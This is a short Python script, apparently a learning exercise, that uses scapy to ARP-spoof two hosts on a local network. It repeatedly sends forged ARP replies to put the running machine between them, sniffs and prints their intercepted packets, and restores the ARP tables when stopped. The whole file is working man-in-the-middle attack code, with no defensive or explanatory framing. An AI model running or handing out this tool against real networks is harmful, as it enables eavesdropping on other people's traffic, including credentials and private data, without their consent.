from async_timeout import timeout
from scapy.all import *
import sys, time


def getMAC(ip): #Ether has 3 fields, 2 of those are dst and src, which contain the MAC addr of destination and source
    print(f'Getting MAC address for {ip} on interface {conf.iface}: ', end="")
    arp_packet = Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip)#The sequence of 'F' is a reserved broadcast address
    ans = None
    counter = 0
    while ans == None and counter < 10:
        ans = srp1(arp_packet, verbose=False)#sends packets and recieves answers on layer 2. returns answered and unanswered
        counter += 1
        
    if ans == None:
        print("Failed to get response")
        return None
    else:
        print(ans[Ether].src)
        return ans[Ether].src

    #Set fields of an arp packet, and send it
def spoof_target(target_ipv4, target_MAC, spoof_ipv4): #This will convince target to send me their packets
    packet = ARP()
    packet.op = 2 #two is enumeration for "reply", 1 would be for "request"
    packet.psrc = spoof_ipv4 #convince target 
    packet.hwdst = target_MAC
    packet.pdst = target_ipv4
    send(packet)

def unspoof(dest_IP, dest_mac, src_IP, src_mac):
    packet = ARP(op =2, pdst = dest_IP, hwdst = dest_mac, psrc = src_IP, hwsrc = src_mac)
    send(packet, verbose=False)

def main(machine_IP:str, host_IP:str):
    print(f'Machine IP = {machine_IP}, host IP = {host_IP}\n')
    machine_MAC = getMAC(machine_IP)
    host_MAC = getMAC(host_IP)
    try:
        while(True): #Prevents my desired settings from being overwritten by defaults
            spoof_target(machine_IP, machine_MAC, host_IP)
            spoof_target(host_IP, host_MAC, machine_IP)
            print("\nMachine sending packet: ")
            sniff(iface="eth0", filter=f"not arp and host {machine_IP}", prn=lambda x: x.show(), store=False, timeout=1)
            print("\nHost sending packet: ")
            sniff(iface="eth0", filter=f"not arp and host {host_IP}", prn=lambda x: x.show(), store=False, timeout=1)
    except KeyboardInterrupt:
        print("\nUser stopped execution")
    unspoof(host_IP, host_MAC, machine_IP, machine_MAC)
    unspoof(machine_IP, machine_MAC, host_IP, host_MAC)
    print('Unspoofed target and host')

if __name__ == '__main__':
    conf.iface = "eth0"
    if len(sys.argv) != 3:
        print(f'Missing arguments, need 2 but got {len(sys.argv)-1}')
    elif sys.argv[1] == sys.argv[2]:
        print("Cannot target two identical IPv4 addresses")
    else:
        main(sys.argv[1], sys.argv[2])
